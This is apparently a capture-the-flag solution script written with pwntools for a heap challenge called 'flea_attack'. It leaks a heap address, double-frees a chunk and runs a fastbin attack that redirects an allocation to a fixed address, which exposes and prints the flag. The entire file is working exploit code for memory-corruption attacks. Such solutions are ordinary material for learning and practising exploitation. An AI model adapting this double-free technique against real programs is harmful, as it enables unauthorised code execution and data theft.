from pwn import *

victim = 0x204056

def alloc(size, name):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(size))

	if len(name) < size:
		name += '\n'
	r.sendafter(': ', name)
	r.recvuntil('Addr: ')
	return int(r.recvline().strip(), 16)

def free(addr):
	r.sendlineafter('> ', '2')
	r.sendlineafter('Addr: ', hex(addr))
	return

def get_flag(size, name):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(size))

	if len(name) < size:
		name += '\n'
	r.sendafter(': ', name)
	r.recvuntil('Name: ')
	r.recvline()
	return r.recvline().strip()

def exit():
	r.sendlineafter('> ', '3')
	return

def pwn():

	r.sendafter(':', p8(0x41)*95)

	chunk_0 = alloc(0x30, 'A'*8)
	chunk_1 = alloc(0x30, 'B'*8)
	chunk_2 = alloc(0x30, 'C'*8)
	heap    = chunk_0 - 0x1250

	log.success('Heap: 0x{:x}'.format(heap))

	# Double free
	free(chunk_0)
	free(chunk_1)
	free(chunk_0)
	# Fastbin attack
	alloc(0x30, p64(victim))
	alloc(0x30, 'D'*8)
	alloc(0x30, 'E'*8)
	# Write up to the flag's start
	flag = get_flag(0x30, 'F'*25)

	log.success('Flag: {}'.format(flag))

	exit()
	
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./flea_attack')
        pause()
        pwn()
